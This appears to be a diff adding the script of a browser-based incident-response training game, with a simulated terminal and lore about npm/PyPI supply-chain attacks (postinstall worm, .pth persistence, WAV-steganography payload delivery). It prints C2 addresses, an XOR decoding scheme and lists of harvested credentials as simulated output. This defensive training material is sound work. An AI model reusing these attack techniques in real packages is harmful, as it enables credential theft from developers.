+    if (id==='ghost') { _tick('read_wav_code'); return [{text:'connect(83.142.209.203:8080) = 0   ← MALICIOUS C2',cls:'ioc'},{text:'GET /ringtone.wav HTTP/1.1          ← WAV stego delivery',cls:'ioc'},{text:'# Cert: 30015DD1E2CF4DBD49FFF9DDEF2AD462',cls:'comment'},{text:'# Same C2 as litellm campaign',cls:'comment'}]; }
+    return [{text:'strace: attach failed: Operation not permitted',cls:'err'}];
+  }
+  function _cmdLsof() {
+    const id=_ch?_ch.id:'';
+    const r=[{text:'COMMAND    PID  TYPE  NAME',cls:'comment'}];
+    if (id==='worm')   r.push({text:'python3  1842  IPv4  workstation->tdtqy-oyaaa.icp0.io:443  ← C2',cls:'ioc'});
+    if (id==='shadow') r.push({text:'python3  2044  IPv4  workstation->checkmarx.zone:443  ← C2',cls:'ioc'});
+    if (id==='ghost')  r.push({text:'python3  3821  IPv4  workstation->83.142.209.203:8080  ← C2',cls:'ioc'});
+    return r;
+  }
+  function _cmdXxd(a) {
+    const f=a[1]||'', id=_ch?_ch.id:'';
+    if (/wav/i.test(f)&&id==='ghost') { _tick('read_wav_code'); return [{text:'00000000: 5249 4646 xxxx xxxx 5741 5645  RIFF....WAVE',cls:'out'},{text:'00000044: a3f2 891c 044d 7e88  [XOR KEY — first 8 bytes]',cls:'ioc'},{text:'0000004c: e9c4 b872 3119 2d6e  [...XOR\'d payload...]',cls:'out'},{text:'# Decode: key=raw[:8]; data=[raw[8+i]^key[i%8] for i...]',cls:'comment'}]; }
+    return [{text:`xxd: ${f||'file'}: No such file or directory`,cls:'err'}];
+  }
+  function _cmdPython(a, raw) {
+    if (/wav|xor|ringtone|decode.*wav/i.test(raw)) { _tick('read_wav_code'); return [{text:'XOR key: a3f2891c044d7e88',cls:'ioc'},{text:'Decoded payload: 47320 bytes',cls:'out'},{text:'# Harvests: AWS, GCP, K8s, SSH, .env, shell history',cls:'comment'}]; }
+    return [{text:'python3: specify a script or -c for inline code',cls:'err'}];
+  }
+  function _cmdHelp() {
+    return [
+      {text:'─ Navigation ───────────────────────────────────────',cls:'comment'},
+      {text:'ls [path]   cat <file>   cd <path>   pwd   find <path> -name <pat>',cls:'out'},
+      {text:'grep <pattern> <file>   history   whoami   uname',cls:'out'},
+      {text:'─ Processes ──────────────────────────────────────',cls:'comment'},
+      {text:'ps aux   ps aux | grep <x>   lsof -i   strace -p <pid>',cls:'out'},
+      {text:'kill <pid>   pkill -f <pattern>',cls:'out'},
+      {text:'─ Packages ───────────────────────────────────────',cls:'comment'},
+      {text:'pip show <pkg>   pip uninstall -y <pkg>   pip list',cls:'out'},
+      {text:'npm ls   npm token revoke',cls:'out'},
+      {text:'─ Remediation ───────────────────────────────────',cls:'comment'},
+      {text:'systemctl status|disable|stop <svc>   rm -rf <path>',cls:'out'},
+      {text:'iptables -A OUTPUT -d <ip> -j DROP   xxd <file>',cls:'out'},
+      {text:'─ Shell ────────────────────────────────────────────',cls:'comment'},
+      {text:'↑/↓ history   Ctrl+L clear   ESC close terminal',cls:'out'},
+    ];
+  }
+  function _tok(cmd) {
+    const t=[]; let c='', q=null;
+    for (const ch of cmd) { if(q){if(ch===q)q=null;else c+=ch;}else if(ch==='"'||ch==="'")q=ch;else if(ch===' '){if(c){t.push(c);c='';}}else c+=ch; }
+    if(c)t.push(c); return t;
+  }
+  function execute(raw) {
+    const input=raw.trim(); if(!input)return[];
+    const pi=input.indexOf(' | ');
+    let main=input, pipeRight=null;
+    if(pi!==-1){main=input.slice(0,pi).trim();pipeRight=input.slice(pi+3).trim();}
+    const parts=_tok(main); if(!parts.length)return[];
+    const verb=parts[0].toLowerCase();
+    let lines;
+    switch(verb){
+      case 'ls':       lines=_cmdLs(parts);break;
+      case 'cat':      lines=_cmdCat(parts);break;
+      case 'cd':       lines=_cmdCd(parts);break;
+      case 'pwd':      lines=[{text:_cwd,cls:'out'}];break;
+      case 'whoami':   lines=[{text:'dev',cls:'out'}];break;
+      case 'uname':    lines=[{text:'Linux workstation 5.15.0 x86_64 GNU/Linux',cls:'out'}];break;
+      case 'history':  lines=_history.map((c,i)=>({text:`  ${_history.length-i}  ${c}`,cls:'out'}));break;
+      case 'clear':    lines=[{text:'__CLEAR__',cls:'meta'}];break;
+      case 'help':     lines=_cmdHelp();break;
+      case 'ps':       lines=_cmdPs();break;
+      case 'grep':     lines=_cmdGrep(parts);break;
+      case 'find':     lines=_cmdFind(parts);break;
+      case 'systemctl':lines=_cmdSystemctl(parts);break;
+      case 'pip':      lines=_cmdPip(parts);break;
+      case 'npm':      lines=_cmdNpm(parts);break;
+      case 'rm':       lines=_cmdRm(parts);break;
+      case 'kill':     lines=_cmdKill(parts);break;
+      case 'pkill':    lines=_cmdPkill(parts);break;
+      case 'iptables': lines=_cmdIptables(parts);break;
+      case 'strace':   lines=_cmdStrace();break;
+      case 'lsof':     lines=_cmdLsof();break;
+      case 'xxd':      lines=_cmdXxd(parts);break;
+      case 'python3':
+      case 'python':   lines=_cmdPython(parts,raw);break;
+      default:         lines=[{text:`bash: ${verb}: command not found`,cls:'err'}];
+    }
+    if(pipeRight&&lines.length){
+      const gp=_tok(pipeRight);
+      if(gp[0]==='grep'){
+        const inv=gp.includes('-v'), pat=gp.find((x,i)=>i>0&&!x.startsWith('-'))||'';
+        if(pat) lines=lines.filter(l=>{const m=l.text.toLowerCase().includes(pat.toLowerCase());return inv?!m:m;});
+      }
+    }
+    return lines;
+  }
+
+  return {
+    init(idx){_cwd='/home/dev';_fs=VIRTUAL_FS[idx];_ch=CHALLENGES[idx];_history=[];_histIdx=-1;_done.clear();_hIdx=0;if(_hTimer){clearTimeout(_hTimer);_hTimer=null;}},
+    ps1(){return `dev@workstation:${_cwd.replace('/home/dev','~')}$ `;},
+    execute,
+    pushHistory(cmd){_history.unshift(cmd);_histIdx=-1;},
+    navHistory(dir){if(dir==='up'&&_histIdx<_history.length-1)_histIdx++;else if(dir==='down'&&_histIdx>-1)_histIdx--;return _histIdx>=0?_history[_histIdx]:'';},
+    scheduleHint(){if(!_ch||_hIdx>=_ch.hints.length)return;const h=_ch.hints[_hIdx];_hTimer=setTimeout(()=>{appendHint(h.text);_hIdx++;_hTimer=null;this.scheduleHint();},h.delay*1000);},
+    resetHintTimer(){if(_hTimer){clearTimeout(_hTimer);_hTimer=null;}this.scheduleHint();},
+    stopHints(){if(_hTimer){clearTimeout(_hTimer);_hTimer=null;}},
+  };
+})();
+
+// Terminal input handler
+document.getElementById('term-input').addEventListener('keydown', e => {
+  if (e.key === 'Enter') {
+    e.preventDefault();
+    const cmd = e.target.value.trim();
+    e.target.value = '';
+    if (!cmd) return;
+    TermShell.pushHistory(cmd);
+    const lines = TermShell.execute(cmd);
+    appendToTerminal(cmd, lines);
+    document.getElementById('term-ps1-label').textContent = TermShell.ps1();
+    TermShell.resetHintTimer();
+  } else if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    const v = TermShell.navHistory('up');
+    e.target.value = v;
+    setTimeout(() => e.target.setSelectionRange(v.length, v.length), 0);
+  } else if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    e.target.value = TermShell.navHistory('down');
+  } else if (e.key === 'Escape') {
+    closeTerminalFailed();
+  } else if (e.ctrlKey && e.key === 'l') {
+    e.preventDefault();
+    document.getElementById('term-output').innerHTML = '';
+  }
+});
+
+// ── LORE DATA ──────────────────────────────────────────────
+const LORE = [
+  {
+    act: 'ACT 1 // RESOLVED', title: 'CANISTERWORM: ICP BLOCKCHAIN C2', color: '#00ff6e',
+    body: `<b>What happened:</b> On March 20, 2026, TeamPCP deployed a self-propagating worm across npm. The vector: a malicious <code>checkmarx</code> package with a <code>postinstall: "node deploy.js"</code> hook that ran on every <code>npm install</code>.<br><br>
+<b>The worm loop:</b> deploy.js read <code>~/.npmrc</code> tokens → authenticated to npm → republished a malicious version under every package the victim owned → each new install spread further. 47 packages in under 60 seconds.<br><br>
+<b>C2:</b> <span class="ioc">tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io</span> — an Internet Computer Protocol blockchain canister. Decentralised, censorship-resistant, near-impossible to take down.<br><br>
+<b>Persistence:</b> <code>pgmon.service</code> — disguised as a PostgreSQL process monitor. Fired on every system boot.<br><br>
+<b>Research:</b> Mend.io Security Research — full campaign documentation and IOC disclosure published April 30, 2026.`
+  },
+  {
+    act: 'ACT 2 // RESOLVED', title: 'LITELLM .PTH PERSISTENCE: AUTO-EXECUTE ON STARTUP', color: '#b44dff',
+    body: `<b>What happened:</b> MegaGame10418 exploited a <code>pull_request_target</code> misconfiguration in Trivy's CI to steal the <code>aqua-bot</code> GitHub PAT. With the stolen <code>PYPI_PUBLISH_PASSWORD</code>, TeamPCP published <code>litellm 1.82.7</code> and <code>1.82.8</code> (~95M monthly downloads).<br><br>
+<b>The .pth trick:</b> Python automatically executes <code>.pth</code> files in site-packages on every interpreter startup. The malicious <code>litellm_init.pth</code> launched a detached credential harvester — even after <code>pip uninstall</code>.<br><br>
+<b>What it stole:</b> AWS credentials, GCP tokens, Azure keys, Kubernetes tokens, SSH private keys, <code>.env</code> files, shell history, LLM API keys.<br><br>
+<b>Exfil:</b> AES-256-CBC + RSA-4096 OAEP → <span class="ioc">tpcp.tar.gz</span> → <span class="ioc">83.142.209.203:8080</span>.<br><br>
+<b>Key IOC:</b> <code>litellm_init.pth</code> in site-packages. Also: <code>sysmon.service</code> polling <span class="ioc">checkmarx.zone</span> every ~50 minutes.`
+  },
+  {
+    act: 'ACT 3 // BOSS DEFEATED', title: 'TELNYX WAV STEGANOGRAPHY DELIVERY', color: '#ff1a3c',
+    body: `<b>What happened:</b> March 27, 2026 — <code>telnyx 4.87.1</code> and <code>4.87.2</code> published to PyPI. Telnyx is a telephony SDK used in production voice and SMS applications.<br><br>
+<b>WAV steganography:</b> Instead of embedding a payload directly, the package fetched a <code>.wav</code> audio file from <span class="ioc">83.142.209.203:8080</span>. The WAV frames contained no real audio — they held a base64-encoded, XOR-obfuscated Python script. XOR key = first 8 bytes of the decoded data.<br><br>
+<b>Linux/macOS:</b> <span class="ioc">GET /ringtone.wav</span> → decoded Python → piped to <code>python3 -</code> with <code>start_new_session=True</code>. Survives parent process exit.<br><br>
+<b>Windows:</b> <span class="ioc">GET /hangup.wav</span> → decoded PE binary → written as <span class="ioc">Startup/msbuild.exe</span>. Runs silently at every login. No admin required.<br><br>
+<b>Attribution:</b> Identical RSA-4096 key, identical C2, identical <code>tpcp.tar.gz</code> exfil format as Acts 1 and 2. All three waves = <strong>TeamPCP (Persy_PCP)</strong>.`
+  }
+];
+
+// ═══════════════════════════════════════════════════════════
+// BOOT
+// ═══════════════════════════════════════════════════════════
+const loadMessages = [
+  'SCANNING npm REGISTRY...',
+  'TRACING ICP CANISTER C2...',
+  'DECODING WAV FRAMES...',
+  'LOADING TEAMPCP INTELLIGENCE...',
+  'BUILDING DOSSIER...',
+  'READY.'
+];
+
+(function boot() {
+  const bar = document.getElementById('l-bar');
+  const status = document.getElementById('l-status');
+  let p = 0, mi = 0;
+  const iv = setInterval(() => {
+    p += Math.random() * 18 + 4;
+    if (p > 100) p = 100;
+    bar.style.width = p + '%';
+    const ni = Math.min(Math.floor(p / 17), loadMessages.length - 1);
+    if (ni > mi) { mi = ni; status.textContent = loadMessages[mi]; }
+    if (p >= 100) {
+      clearInterval(iv);
+      setTimeout(() => {
+        document.getElementById('loading').classList.add('fade');
+        updateHUD();
+        setTimeout(() => {
+          document.getElementById('loading').style.display = 'none';
+          showActTransition(0, () => showBriefing(0));
+        }, 900);
+      }, 400);
+    }
+  }, 80);
+})();
+</script>
+</body>
+</html>
